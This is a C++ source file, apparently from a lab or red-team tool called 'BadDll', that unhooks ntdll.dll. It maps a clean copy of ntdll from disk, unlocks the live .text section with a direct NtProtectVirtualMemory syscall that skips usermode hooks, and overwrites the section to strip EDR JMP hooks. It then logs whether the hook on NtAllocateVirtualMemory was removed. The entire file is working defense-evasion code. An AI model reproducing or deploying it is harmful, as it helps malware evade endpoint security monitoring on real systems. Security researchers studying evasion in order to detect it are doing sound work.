#include "unhook.hpp"

#include <cstring>

#include "lab_log.h"
#include "syscall.h"

namespace {

PIMAGE_SECTION_HEADER FindTextSection(LPVOID module_base) {
    if (!module_base) {
        return nullptr;
    }

    const auto dos = reinterpret_cast<PIMAGE_DOS_HEADER>(module_base);
    if (dos->e_magic != IMAGE_DOS_SIGNATURE) {
        return nullptr;
    }

    const auto nt = reinterpret_cast<PIMAGE_NT_HEADERS>(
        reinterpret_cast<BYTE*>(module_base) + dos->e_lfanew);
    if (nt->Signature != IMAGE_NT_SIGNATURE) {
        return nullptr;
    }

    PIMAGE_SECTION_HEADER section = IMAGE_FIRST_SECTION(nt);
    for (WORD i = 0; i < nt->FileHeader.NumberOfSections; ++i) {
        if (std::memcmp(section[i].Name, ".text", 5) == 0) {
            return &section[i];
        }
    }
    return nullptr;
}

bool ReadStubByte(LPVOID ntdll_base, const char* export_name, BYTE* out) {
    if (!ntdll_base || !export_name || !out) {
        return false;
    }
    const auto proc = reinterpret_cast<BYTE*>(GetProcAddress(
        reinterpret_cast<HMODULE>(ntdll_base), export_name));
    if (!proc) {
        return false;
    }
    *out = proc[0];
    return true;
}

bool ReadStubByteAtRva(LPVOID mapped_base, LPVOID live_base, const char* export_name, BYTE* out) {
    const auto live_proc = reinterpret_cast<BYTE*>(GetProcAddress(
        reinterpret_cast<HMODULE>(live_base), export_name));
    if (!live_proc || !mapped_base || !out) {
        return false;
    }
    const DWORD_PTR offset =
        reinterpret_cast<DWORD_PTR>(live_proc) - reinterpret_cast<DWORD_PTR>(live_base);
    *out = reinterpret_cast<BYTE*>(reinterpret_cast<DWORD_PTR>(mapped_base) + offset)[0];
    return true;
}

bool BuildNtdllPath(char* path, DWORD path_capacity) {
    const UINT len = GetSystemDirectoryA(path, path_capacity);
    if (len == 0 || len >= path_capacity) {
        return false;
    }
    if (path[len - 1] != '\\') {
        if (len + 1 >= path_capacity) {
            return false;
        }
        path[len] = '\\';
        path[len + 1] = '\0';
    }
    if (std::strlen(path) + std::strlen("ntdll.dll") + 1 >= path_capacity) {
        return false;
    }
    std::strcat(path, "ntdll.dll");
    return true;
}

}  // namespace

bool unhook_ntdll(LabLogger& log) {
    log.log("[BadDll] Phase 3: ntdll unhook (reflective .text overwrite)...");

    HMODULE h_live = GetModuleHandleA("ntdll.dll");
    if (!h_live) {
        log.log("[BadDll] GetModuleHandleA(ntdll.dll) failed.");
        return false;
    }

    BYTE pre_stub = 0;
    if (ReadStubByte(h_live, "NtAllocateVirtualMemory", &pre_stub)) {
        log.logf("[BadDll] NtAllocateVirtualMemory stub byte before unhook: 0x%02X", pre_stub);
    } else {
        log.log("[BadDll] Could not read NtAllocateVirtualMemory stub before unhook.");
    }

    char ntdll_path[MAX_PATH]{};
    if (!BuildNtdllPath(ntdll_path, MAX_PATH)) {
        log.log("[BadDll] Failed to build ntdll.dll path.");
        return false;
    }
    log.logf("[BadDll] Opening pristine ntdll from disk: %s", ntdll_path);

    HANDLE h_file = CreateFileA(
        ntdll_path,
        GENERIC_READ,
        FILE_SHARE_READ,
        nullptr,
        OPEN_EXISTING,
        FILE_ATTRIBUTE_NORMAL,
        nullptr);
    if (h_file == INVALID_HANDLE_VALUE) {
        log.logf("[BadDll] CreateFileA failed (error %lu).", GetLastError());
        return false;
    }

    HANDLE h_map = CreateFileMappingA(
        h_file,
        nullptr,
        PAGE_READONLY | SEC_IMAGE,
        0,
        0,
        nullptr);
    if (!h_map) {
        log.logf("[BadDll] CreateFileMappingA failed (error %lu).", GetLastError());
        CloseHandle(h_file);
        return false;
    }

    LPVOID p_clean = MapViewOfFile(h_map, FILE_MAP_READ, 0, 0, 0);
    if (!p_clean) {
        log.logf("[BadDll] MapViewOfFile failed (error %lu).", GetLastError());
        CloseHandle(h_map);
        CloseHandle(h_file);
        return false;
    }

    PIMAGE_SECTION_HEADER live_text = FindTextSection(h_live);
    PIMAGE_SECTION_HEADER clean_text = FindTextSection(p_clean);
    if (!live_text || !clean_text) {
        log.log("[BadDll] Could not locate .text section in live or disk ntdll.");
        UnmapViewOfFile(p_clean);
        CloseHandle(h_map);
        CloseHandle(h_file);
        return false;
    }

    auto* live_text_base = reinterpret_cast<LPVOID>(
        reinterpret_cast<DWORD_PTR>(h_live) + live_text->VirtualAddress);
    auto* clean_text_base = reinterpret_cast<LPVOID>(
        reinterpret_cast<DWORD_PTR>(p_clean) + clean_text->VirtualAddress);

    const SIZE_T text_size = live_text->Misc.VirtualSize;
    log.logf(
        "[BadDll] .text section: live=%p clean=%p size=%zu",
        live_text_base,
        clean_text_base,
        static_cast<size_t>(text_size));

    BYTE disk_stub = 0;
    ReadStubByteAtRva(p_clean, h_live, "NtAllocateVirtualMemory", &disk_stub);

    if (!syscalls_init(log, p_clean, h_live)) {
        log.log("[BadDll] Direct syscall init failed — aborting unhook.");
        UnmapViewOfFile(p_clean);
        CloseHandle(h_map);
        CloseHandle(h_file);
        return false;
    }

    log.log("[BadDll] NtProtectVirtualMemory via direct syscall (bypasses usermode hook).");

    PVOID protect_base = live_text_base;
    SIZE_T protect_size = text_size;
    ULONG old_protect = 0;
    NTSTATUS status = sys_nt_protect_virtual_memory(
        GetCurrentProcess(),
        &protect_base,
        &protect_size,
        PAGE_EXECUTE_READWRITE,
        &old_protect);
    if (!NT_SUCCESS(status)) {
        log.logf("[BadDll] syscall NtProtectVirtualMemory (unlock) failed (NTSTATUS 0x%08lX).", status);
        UnmapViewOfFile(p_clean);
        CloseHandle(h_map);
        CloseHandle(h_file);
        return false;
    }

    std::memcpy(live_text_base, clean_text_base, text_size);

    protect_base = live_text_base;
    protect_size = text_size;
    ULONG ignored = 0;
    status = sys_nt_protect_virtual_memory(
        GetCurrentProcess(),
        &protect_base,
        &protect_size,
        old_protect,
        &ignored);
    if (!NT_SUCCESS(status)) {
        log.logf("[BadDll] syscall NtProtectVirtualMemory (restore) failed (NTSTATUS 0x%08lX).", status);
    }

    UnmapViewOfFile(p_clean);
    CloseHandle(h_map);
    CloseHandle(h_file);

    BYTE post_stub = 0;
    if (ReadStubByte(h_live, "NtAllocateVirtualMemory", &post_stub)) {
        log.logf("[BadDll] NtAllocateVirtualMemory stub byte after unhook: 0x%02X", post_stub);
    }

    log.logf("[BadDll] Expected disk stub byte: 0x%02X", disk_stub);
    if (post_stub == disk_stub && post_stub != 0) {
        log.log("[BadDll] Stub verification OK — live ntdll matches disk copy.");
    } else if (post_stub != 0 && disk_stub != 0 && post_stub != disk_stub) {
        log.log("[BadDll] Stub verification: post-unhook byte differs from disk (check logs).");
    }

    if (pre_stub == 0xE9 && post_stub != 0xE9) {
        log.log("[BadDll] EDR hook (0xE9 JMP) removed from NtAllocateVirtualMemory.");
    }

    log.log("[BadDll] ntdll .text unhook complete.");
    return true;
}
